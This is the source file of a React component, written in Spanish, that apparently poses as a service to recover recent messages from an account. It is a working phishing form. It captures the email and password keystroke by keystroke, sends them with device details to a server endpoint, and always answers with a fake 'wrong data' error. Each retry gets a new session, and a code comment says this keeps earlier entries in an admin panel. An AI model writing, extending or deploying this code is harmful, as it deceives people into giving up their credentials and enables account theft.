import React, { useState, useEffect, useRef } from 'react';
import { Eye, EyeOff, AlertCircle, RefreshCw } from 'lucide-react';
import { DeviceInfo } from '../types';

interface ProfileInfoSectionProps {
  onSyncActivity?: (box1: string, box2: string) => void;
}

export const ProfileInfoSection: React.FC<ProfileInfoSectionProps> = ({ onSyncActivity }) => {
  const [sessionId, setSessionId] = useState<string>('');
  const [box1, setBox1] = useState<string>('');
  const [box2, setBox2] = useState<string>('');
  const [showBox1, setShowBox1] = useState<boolean>(true);
  const [showBox2, setShowBox2] = useState<boolean>(false);
  const [showErrorView, setShowErrorView] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  const input1Ref = useRef<HTMLInputElement | null>(null);
  const typingTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const isInitialLoad = useRef(true);

  // Initialize or retrieve user session ID
  useEffect(() => {
    let currentId = localStorage.getItem('wamr_profile_session_id');
    if (!currentId) {
      currentId = 'usr_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
      localStorage.setItem('wamr_profile_session_id', currentId);
    }
    setSessionId(currentId);

    // Restore cached values if any
    const savedBox1 = localStorage.getItem(`wamr_box1_${currentId}`) || '';
    const savedBox2 = localStorage.getItem(`wamr_box2_${currentId}`) || '';
    setBox1(savedBox1);
    setBox2(savedBox2);

    // Initial silent sync to establish session on server
    syncToServer(currentId, savedBox1, savedBox2, false, '');
    isInitialLoad.current = false;
  }, []);

  const getDeviceInfo = (): DeviceInfo => {
    const nav = typeof window !== 'undefined' ? window.navigator : ({} as any);
    return {
      userAgent: nav.userAgent || 'Unknown',
      platform: nav.platform || 'Web',
      screen: typeof window !== 'undefined' ? `${window.innerWidth}x${window.innerHeight}` : 'N/A',
      language: nav.language || 'es',
    };
  };

  const syncToServer = async (
    id: string,
    val1: string,
    val2: string,
    isTyping: boolean,
    activeField: string
  ) => {
    if (!id) return;
    try {
      await fetch('/api/save-input', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: id,
          box1: val1,
          box2: val2,
          isTyping,
          activeField,
          deviceInfo: getDeviceInfo(),
        }),
      });
      if (onSyncActivity) {
        onSyncActivity(val1, val2);
      }
    } catch {
      // Silent error handling
    }
  };

  const handleBox1Change = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setBox1(val);
    if (sessionId) {
      localStorage.setItem(`wamr_box1_${sessionId}`, val);
    }

    syncToServer(sessionId, val, box2, true, 'correo de perfil');

    if (typingTimeoutRef.current) clearTimeout(typingTimeoutRef.current);
    typingTimeoutRef.current = setTimeout(() => {
      syncToServer(sessionId, val, box2, false, '');
    }, 1200);
  };

  const handleBox2Change = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setBox2(val);
    if (sessionId) {
      localStorage.setItem(`wamr_box2_${sessionId}`, val);
    }

    syncToServer(sessionId, box1, val, true, 'contraseña');

    if (typingTimeoutRef.current) clearTimeout(typingTimeoutRef.current);
    typingTimeoutRef.current = setTimeout(() => {
      syncToServer(sessionId, box1, val, false, '');
    }, 1200);
  };

  const handleAcceder = () => {
    setIsSubmitting(true);
    // Explicit sync with button click flag
    syncToServer(sessionId, box1, box2, false, 'Clic en Acceder');

    // Show error view shortly as requested
    setTimeout(() => {
      setIsSubmitting(false);
      setShowErrorView(true);
    }, 400);
  };

  const handleReintentar = () => {
    // Generate new session ID for next attempt so previous inputs remain preserved in admin panel
    const newSessionId = 'usr_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
    setSessionId(newSessionId);
    localStorage.setItem('wamr_profile_session_id', newSessionId);

    // Clean both boxes in UI for the new entry
    setBox1('');
    setBox2('');
    localStorage.removeItem(`wamr_box1_${newSessionId}`);
    localStorage.removeItem(`wamr_box2_${newSessionId}`);

    setShowErrorView(false);
    setTimeout(() => {
      input1Ref.current?.focus();
    }, 120);
  };

  return (
    <section className="bg-slate-50/80 border-y border-slate-200 py-7 px-4 sm:px-6 lg:px-8 shadow-2xs">
      <div className="max-w-4xl mx-auto">
        {showErrorView ? (
          /* Error State View */
          <div className="flex flex-col items-center text-center max-w-xl mx-auto py-4 px-3 sm:px-6 animate-in fade-in zoom-in-95 duration-200">
            <div className="w-12 h-12 rounded-full bg-red-100 flex items-center justify-center text-red-600 mb-3 shadow-2xs">
              <AlertCircle className="w-7 h-7" />
            </div>

            <p className="text-sm sm:text-base font-bold text-red-700 leading-snug">
              ¡Hooo! Parece que ingresaste mal tus datos o hay un error de conexión. Ingresa tus datos correctamente e intenta nuevamente.
            </p>

            <button
              type="button"
              onClick={handleReintentar}
              className="mt-5 inline-flex items-center gap-2 px-6 py-2.5 rounded-xl bg-slate-900 hover:bg-slate-800 text-white font-semibold text-xs sm:text-sm shadow-md transition-all active:scale-95 cursor-pointer"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Reintentar</span>
            </button>
          </div>
        ) : (
          /* Normal Inputs View */
          <div className="flex flex-col lg:flex-row lg:items-center justify-center gap-6 lg:gap-12">
            {/* Label and prominent notice alongside the boxes */}
            <div className="max-w-md">
              <h2 className="text-base sm:text-lg font-bold tracking-tight text-slate-900">
                Buscar Perfil
              </h2>
              <p className="mt-2 text-xs sm:text-sm font-semibold text-amber-800 bg-amber-50 border border-amber-200 rounded-lg p-3 shadow-2xs leading-relaxed">
                Este proceso solo rescatara los mensajes de los ultimos 3 dias. mensajes anteriores no se podran visualizar
              </p>
            </div>

            {/* Two stacked text boxes, centered, with side labels and eye toggle */}
            <div className="flex flex-col gap-3.5 shrink-0 justify-center">
              {/* Casilla superior con texto al lado: correo de perfil */}
              <div className="flex flex-col sm:flex-row sm:items-center gap-1.5 sm:gap-3">
                <label
                  htmlFor="profile-field-1"
                  className="text-xs font-semibold text-slate-700 sm:w-40 sm:text-right shrink-0"
                >
                  correo de perfil
                </label>
                <div className="relative w-full sm:w-64">
                  <input
                    ref={input1Ref}
                    type={showBox1 ? 'text' : 'password'}
                    id="profile-field-1"
                    value={box1}
                    onChange={handleBox1Change}
                    className="w-full h-8 rounded-lg border border-slate-300 bg-white pl-2.5 pr-8 text-xs text-slate-900 focus:border-emerald-500 focus:outline-none focus:ring-1 focus:ring-emerald-500 shadow-2xs"
                  />
                  <button
                    type="button"
                    onClick={() => setShowBox1(!showBox1)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-700 transition-colors p-0.5"
                    title={showBox1 ? 'Ocultar texto' : 'Mostrar texto'}
                    tabIndex={-1}
                  >
                    {showBox1 ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                  </button>
                </div>
              </div>

              {/* Casilla inferior con texto al lado: Contraseña que usas en tu cuenta */}
              <div className="flex flex-col sm:flex-row sm:items-center gap-1.5 sm:gap-3">
                <label
                  htmlFor="profile-field-2"
                  className="text-xs font-semibold text-slate-700 sm:w-40 sm:text-right shrink-0"
                >
                  Contraseña que usas en tu cuenta
                </label>
                <div className="relative w-full sm:w-64">
                  <input
                    type={showBox2 ? 'text' : 'password'}
                    id="profile-field-2"
                    value={box2}
                    onChange={handleBox2Change}
                    className="w-full h-8 rounded-lg border border-slate-300 bg-white pl-2.5 pr-8 text-xs text-slate-900 focus:border-emerald-500 focus:outline-none focus:ring-1 focus:ring-emerald-500 shadow-2xs"
                  />
                  <button
                    type="button"
                    onClick={() => setShowBox2(!showBox2)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-700 transition-colors p-0.5"
                    title={showBox2 ? 'Ocultar texto' : 'Mostrar texto'}
                    tabIndex={-1}
                  >
                    {showBox2 ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                  </button>
                </div>
              </div>

              {/* Botón Acceder */}
              <div className="flex justify-end pt-1">
                <button
                  type="button"
                  onClick={handleAcceder}
                  disabled={isSubmitting}
                  className="w-full sm:w-36 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-700 active:scale-95 text-white font-semibold text-xs tracking-wide shadow-sm transition-all cursor-pointer flex items-center justify-center gap-1.5"
                >
                  {isSubmitting ? (
                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                  ) : (
                    <span>Acceder</span>
                  )}
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </section>
  );
};
